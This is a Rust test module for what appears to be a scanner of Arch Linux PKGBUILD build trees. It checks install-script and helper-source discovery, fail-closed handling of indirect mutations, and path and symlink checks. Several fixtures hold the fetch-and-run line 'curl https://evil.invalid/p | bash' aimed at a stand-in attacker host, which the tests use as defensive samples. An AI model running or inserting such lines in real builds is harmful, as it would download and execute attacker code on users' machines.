        assert!(error.contains("literal expansion marker"), "{error}");
    }

    #[test]
    fn ignores_install_text_in_comments_and_heredoc_bodies() {
        let dir = TestDir::new("install-data");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\n# install=comment.install\nprepare() {\n  cat <<'EOF' > example.txt\ninstall=heredoc.install\nEOF\n}\n",
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert!(tree.install_script_paths.is_empty());
    }

    #[test]
    fn collects_assignment_only_install_with_redirections() {
        let dir = TestDir::new("install-redirections");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\ninstall=evil.install > /dev/null\ninstall=evil.install 2>/dev/null\ninstall=evil.install < /dev/null\ninstall=evil.install <<< ignored\ninstall=evil.install <<'EOF'\ninstall=heredoc-data.install\nEOF\n",
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        dir.write("evil.install", "post_install() { :; }\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.install_script_paths, vec!["evil.install"]);
    }

    #[test]
    fn shell_control_prefixes_expose_install_assignments_and_mutations() {
        let package_names = vec!["demo".to_string()];
        let direct = [
            "if true; then install=evil.install; fi",
            "while true; do install=evil.install; done",
            "until false; do install=evil.install; done",
            "! install=evil.install",
        ];
        for form in direct {
            assert_eq!(
                extract_install_scripts(form, "demo", &package_names, &[]).unwrap(),
                vec!["evil.install"],
                "{form}"
            );
        }

        let indirect = [
            "if printf -v install %s evil.install; then :; fi",
            "while true; do printf -v install %s evil.install; done",
            "! printf -v install %s evil.install",
        ];
        for form in indirect {
            let error = extract_install_scripts(form, "demo", &package_names, &[]).unwrap_err();
            assert!(
                error.contains("indirect install mutation"),
                "{form}: {error}"
            );
        }
    }

    #[test]
    fn declaration_and_control_prefixed_array_data_stays_inert() {
        let package_names = vec!["demo".to_string()];
        let content = "f() { local -a commands=('install=missing.install'); }\ndeclare -ra more_data=('install=missing.install')\nreadonly -a final_data=('install=missing.install')\nif true; then inline_data=('install=missing.install'); fi\nwhile true; do loop_data=('install=missing.install'); break; done\nFLAG=1 prefixed_data=('install=missing.install')\n";

        let install_scripts =
            extract_install_scripts(content, "demo", &package_names, &[]).unwrap();

        assert!(install_scripts.is_empty());
    }

    #[test]
    fn install_arrays_fail_closed_behind_declarations_and_control_words() {
        let package_names = vec!["demo".to_string()];
        for form in [
            "declare -a install=(evil.install)",
            "readonly -a install=(evil.install)",
            "if true; then install=(evil.install); fi",
            "while true; do install=(evil.install); done",
        ] {
            let error = extract_install_scripts(form, "demo", &package_names, &[]).unwrap_err();
            assert!(
                error.contains("install array assignment"),
                "{form}: {error}"
            );
        }
    }

    #[test]
    fn printf_v_is_only_a_mutation_in_option_position() {
        let package_names = vec!["demo".to_string()];

        assert!(
            extract_install_scripts("printf '%s\\n' -v install", "demo", &package_names, &[])
                .unwrap()
                .is_empty()
        );
        assert!(
            extract_install_scripts("printf -- -v install", "demo", &package_names, &[])
                .unwrap()
                .is_empty()
        );
        assert!(
            extract_install_scripts(
                "printf -v install '%s\\n' evil.install",
                "demo",
                &package_names,
                &[]
            )
            .unwrap_err()
            .contains("indirect install mutation")
        );
    }

    #[test]
    fn arithmetic_shift_is_not_a_heredoc_and_does_not_mask_later_inputs() {
        let dir = TestDir::new("arithmetic-shift");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\nvalue=$((1 << 2))\ninstall=demo.install\nsource=('helper.sh')\n",
        );
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = helper.sh\n\npkgname = demo\n",
        );
        dir.write("demo.install", "post_install() { echo installed; }\n");
        dir.write("helper.sh", "echo helper\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.install_script_paths, vec!["demo.install"]);
        assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
        assert_eq!(tree.local_source_content.as_deref(), Some("echo helper\n"));
    }

    #[test]
    fn loads_utf8_local_sources_but_not_remote_sources() {
        let dir = TestDir::new("local-sources");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\nsource=('helper.sh' 'https://example.invalid/archive.tar.gz')\n",
        );
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = helper.sh\n\tsource = renamed.tar.gz::https://example.invalid/archive.tar.gz\n\npkgname = demo\n",
        );
        dir.write("helper.sh", "curl https://evil.invalid/p | bash\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
        assert_eq!(
            tree.local_source_content.as_deref(),
            Some("curl https://evil.invalid/p | bash\n")
        );
    }

    #[test]
    fn resolves_but_does_not_append_inert_binary_sources() {
        let dir = TestDir::new("binary-source");
        dir.write("PKGBUILD", "pkgname=demo\nsource=('blob.bin')\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = blob.bin\n\npkgname = demo\n",
        );
        dir.write_bytes("blob.bin", &[0xff, 0xfe, 0xfd]);

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert!(tree.local_source_paths.is_empty());
        assert!(tree.local_source_content.is_none());
    }

    #[test]
    fn scans_invalid_utf8_executable_helpers_lossily() {
        let dir = TestDir::new("invalid-utf8-helper");
        dir.write("PKGBUILD", "pkgname=demo\nsource=('helper.sh')\n");
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        dir.write_bytes(
            "helper.sh",
            b"#!/bin/sh\n# invalid byte: \xff\ncurl https://evil.invalid/p | bash\n",
        );

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
        let content = tree.local_source_content.unwrap();
        assert!(content.contains('\u{fffd}'));
        assert!(content.contains("curl https://evil.invalid/p | bash"));
    }

    #[test]
    fn discovers_literal_source_array_when_srcinfo_is_stale() {
        let dir = TestDir::new("stale-srcinfo-source");
        dir.write("PKGBUILD", "pkgname=demo\nsource=('payload.sh')\n");
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        dir.write("payload.sh", "curl https://evil.invalid/p | bash\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.local_source_paths, vec!["payload.sh"]);
        assert!(tree.local_source_content.unwrap().contains("evil.invalid"));
    }

    #[test]
    fn discovers_literal_dot_and_source_helpers_without_source_metadata() {
        for (name, invocation) in [("dot", ". payload.sh"), ("source", "source payload.sh")] {
            let dir = TestDir::new(name);
            dir.write(
                "PKGBUILD",
                &format!("pkgname=demo\nprepare() {{ {invocation}; }}\n"),
            );
            dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
            dir.write("payload.sh", "curl https://evil.invalid/p | bash\n");

            let tree = load_build_tree(&dir.0, "demo").unwrap();

            assert_eq!(tree.local_source_paths, vec!["payload.sh"]);
            assert!(tree.local_source_content.unwrap().contains("evil.invalid"));
        }
    }

    #[test]
    fn discovers_control_prefixed_and_declared_source_helpers() {
        let forms = [
            "if source payload.sh; then :; fi",
            "while true; do . payload.sh; done",
            "source[0]=payload.sh",
            "declare -ra source=('payload.sh')",
            "readonly -a source=('payload.sh')",
            "if true; then FLAG=1 source=('payload.sh'); fi",
        ];
        for (index, form) in forms.into_iter().enumerate() {
            let dir = TestDir::new(&format!("declared-source-{index}"));
            dir.write("PKGBUILD", &format!("pkgname=demo\n{form}\n"));
            dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
            dir.write("payload.sh", "curl https://evil.invalid/p | bash\n");

            let tree = load_build_tree(&dir.0, "demo").unwrap();

            assert_eq!(tree.local_source_paths, vec!["payload.sh"], "{form}");
        }
    }

    #[test]
    fn local_source_array_declarations_do_not_create_global_sources() {
        let dir = TestDir::new("local-source-array");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\nprepare() { local -a source=('missing.sh'); :; }\n",
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert!(tree.local_source_paths.is_empty());
    }

    #[test]
    fn discovers_srcdir_executables_and_interpreters_with_option_operands() {
        for (name, invocation, helper) in [
            ("srcdir-executable", "$srcdir/payload.sh", "payload.sh"),
            (
                "braced-srcdir-executable",
                "${srcdir}/payload.sh",
                "payload.sh",
            ),
            (
                "interpreter-option",
                "bash -o errexit payload.sh",
                "payload.sh",
            ),
            (
                "interpreter-code-loading-option",
                "bash --rcfile payload.conf -i",
                "payload.conf",
            ),
            (
                "interpreter-inline-code-loading-option",
                "bash --rcfile=payload.conf -i",
                "payload.conf",
            ),
            (
                "process-substitution-interpreter",
                "cat <(bash payload.dat)",
                "payload.dat",
            ),
            (
                "interpreter-stdin-redirection",
                "bash < \"$srcdir/payload.dat\"",
                "payload.dat",
            ),
            (
                "interpreter-explicit-stdin-redirection",
                "bash 0<payload.dat",
                "payload.dat",
            ),
            (
                "interpreter-read-write-stdin-redirection",
                "bash <> payload.dat",
                "payload.dat",
            ),
        ] {
            let dir = TestDir::new(name);
            dir.write(
                "PKGBUILD",
                &format!(
                    "pkgname=demo\nsource=('{helper}')\nprepare() {{ {invocation}; }}\n"
                ),
            );
            dir.write(
                ".SRCINFO",
                &format!(
                    "pkgbase = demo\n\tsource = {helper}\n\npkgname = demo\n"
                ),
            );
            dir.write(helper, "curl https://evil.invalid/p | bash\n");

            let tree = load_build_tree(&dir.0, "demo").unwrap();

            assert_eq!(tree.local_source_paths, vec![helper], "{invocation}");
        }
    }

    #[test]
    fn install_text_in_command_arguments_and_array_data_is_not_an_assignment() {
        let package_names = vec!["demo".to_string()];
        let content = "echo 'install=missing.install'\nprintf '%s' install=missing.install\ncommands=('install=missing.install')\n";

        let install_scripts =
            extract_install_scripts(content, "demo", &package_names, &[]).unwrap();

        assert!(install_scripts.is_empty());
    }

    #[test]
    fn fails_closed_on_recognizable_indirect_install_mutations() {
        let package_names = vec!["demo".to_string()];
        let forms = [
            "printf -v install %s evil.install",
            "read -r install",
            "mapfile -t install < paths",
            "readarray install < paths",
            "unset -v install",
            "declare install=evil.install",
            "typeset -n target=install",
            "_field=install; printf -v \"$_field\" %s evil.install",
            "printf -v \"${unknown_target}\" %s evil.install",
            "read -r \"$unknown_target\"",
            "declare \"$unknown_target=evil.install\"",
            "typeset -n target=\"$unknown_target\"",
            "eval 'install=evil.install'",
        ];

        for form in forms {
            let error = extract_install_scripts(form, "demo", &package_names, &[]).unwrap_err();
            assert!(
                error.contains("indirect install mutation"),
                "{form}: {error}"
            );
        }
    }

    #[test]
    fn dynamic_option_values_and_literal_other_targets_are_not_install_mutations() {
        let package_names = vec!["demo".to_string()];
        for form in [
            "printf -v other %s value",
            "read -p \"$prompt\" result",
            "mapfile -O \"$origin\" result < paths",
            "declare other=$value",
        ] {
            let scripts = extract_install_scripts(form, "demo", &package_names, &[]).unwrap();
            assert!(scripts.is_empty(), "{form}: {scripts:?}");
        }
    }

    #[test]
    fn interpreter_non_stdin_redirections_do_not_mark_inert_sources_executable() {
        for (name, invocation) in [
            ("interpreter-fd-three", "bash 3<payload.dat"),
            ("interpreter-here-string", "bash <<< payload.dat"),
            ("interpreter-output", "bash > payload.dat"),
        ] {
            let dir = TestDir::new(name);
            dir.write(
                "PKGBUILD",
                &format!(
                    "pkgname=demo\nsource=('payload.dat')\nprepare() {{ {invocation}; }}\n"
                ),
            );
            dir.write(
                ".SRCINFO",
                "pkgbase = demo\n\tsource = payload.dat\n\npkgname = demo\n",
            );
            dir.write("payload.dat", "inert data\n");

            let tree = load_build_tree(&dir.0, "demo").unwrap();

            assert!(tree.local_source_paths.is_empty(), "{invocation}");
        }
    }

    #[test]
    fn inert_docs_and_patches_are_not_concatenated_as_shell() {
        let dir = TestDir::new("inert-local-data");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\nsource=('README' 'example.patch')\n",
        );
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = README\n\tsource = example.patch\n\npkgname = demo\n",
        );
        dir.write(
            "README",
            "example only: curl https://evil.invalid/p | bash\n",
        );
        dir.write(
            "example.patch",
            "+curl https://evil.invalid/payload | bash\n",
        );

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert!(tree.local_source_paths.is_empty());
        assert!(tree.local_source_content.is_none());
    }

    #[test]
    fn rejects_cumulative_executable_helper_size() {
        let dir = TestDir::new("cumulative-helper-size");
        let paths: Vec<_> = (0..5).map(|index| format!("helper-{index}.sh")).collect();
        let source_array = paths
            .iter()
            .map(|path| format!("'{path}'"))
            .collect::<Vec<_>>()
            .join(" ");
        dir.write(
            "PKGBUILD",
            &format!("pkgname=demo\nsource=({source_array})\n"),
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        for path in paths {
            dir.write_bytes(&path, &vec![b'x'; 900_000]);
        }

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(
            error.contains("exceed the 4194304 byte total scan limit"),
            "{error}"
        );
    }

    #[test]
    fn rejects_local_source_path_traversal() {
        let error = parse_srcinfo("pkgbase = demo\n\tsource = ../helper.sh\n\npkgname = demo\n")
            .unwrap_err();

        assert!(error.contains("invalid local source path"), "{error}");
    }

    #[test]
    fn rejects_oversized_local_source() {
        let dir = TestDir::new("large-source");
        dir.write("PKGBUILD", "pkgname=demo\nsource=('large.sh')\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = large.sh\n\npkgname = demo\n",
        );
        dir.write_bytes("large.sh", &vec![b'x'; MAX_LOCAL_SOURCE_BYTES as usize + 1]);

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(
            error.contains("exceeds the 1048576 byte scan limit"),
            "{error}"
        );
    }

    #[test]
    fn rejects_pkgbase_mismatch() {
        let dir = TestDir::new("mismatch");
        dir.write("PKGBUILD", "pkgname=actual\n");
        dir.write(".SRCINFO", "pkgbase = actual\n\npkgname = actual\n");

        let error = load_build_tree(&dir.0, "claimed").unwrap_err();

        assert!(error.contains("PKGBASE mismatch"), "{error}");
    }

    #[test]
    fn package_name_validation_preserves_srcinfo_context() {
        let error = parse_srcinfo("pkgbase = demo\n\npkgname = .hidden\n").unwrap_err();

        assert!(error.contains("from .SRCINFO pkgname"), "{error}");
        assert!(error.contains("invalid package name: .hidden"), "{error}");
    }

    #[test]
    fn rejects_install_path_traversal() {
        let dir = TestDir::new("traversal");
        dir.write("PKGBUILD", "pkgname=demo\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\npkgname = demo\n\tinstall = ../outside.install\n",
        );

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(error.contains("invalid install script path"), "{error}");
    }

    #[test]
    fn rejects_control_characters_in_install_paths() {
        let error = parse_srcinfo(
            "pkgbase = demo\n\npkgname = demo\n\tinstall = malicious\u{1b}[2J.install\n",
        )
        .unwrap_err();

        assert!(error.contains("invalid install script path"), "{error}");
    }

    #[cfg(unix)]
    #[test]
    fn rejects_install_symlink_outside_build_directory() {
        use std::os::unix::fs::symlink;

        let dir = TestDir::new("outside-symlink");
        let outside = TestDir::new("outside-target");
        dir.write("PKGBUILD", "pkgname=demo\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\npkgname = demo\n\tinstall = demo.install\n",
        );
        outside.write("payload.install", "post_install() { echo outside; }\n");
        symlink(
            outside.0.join("payload.install"),
            dir.0.join("demo.install"),
        )
        .unwrap();

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(error.contains("outside build directory"), "{error}");
    }

    #[cfg(unix)]
    #[test]
    fn rejects_local_source_symlink_outside_build_directory() {
        use std::os::unix::fs::symlink;

        let dir = TestDir::new("outside-source-symlink");
        let outside = TestDir::new("outside-source-target");
        dir.write("PKGBUILD", "pkgname=demo\nsource=('helper.sh')\n");
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        outside.write("payload.sh", "echo outside\n");
        symlink(outside.0.join("payload.sh"), dir.0.join("helper.sh")).unwrap();

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(error.contains("outside build directory"), "{error}");
    }

    #[test]
    fn fails_when_referenced_install_script_is_missing() {
        let dir = TestDir::new("missing-install");
        dir.write("PKGBUILD", "pkgname=demo\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\npkgname = demo\n\tinstall = missing.install\n",
        );

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(error.contains("cannot resolve install script"), "{error}");
    }

    #[test]
    fn does_not_evaluate_pkgbuild_shell_code() {
        let dir = TestDir::new("inert");
        let marker = dir.0.join("evaluated");
        dir.write(
            "PKGBUILD",
            &format!("pkgname=demo\npkgver=$(touch {})\n", marker.display()),
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");

        load_build_tree(&dir.0, "demo").unwrap();

        assert!(!marker.exists(), "PKGBUILD was unexpectedly evaluated");
    }
}
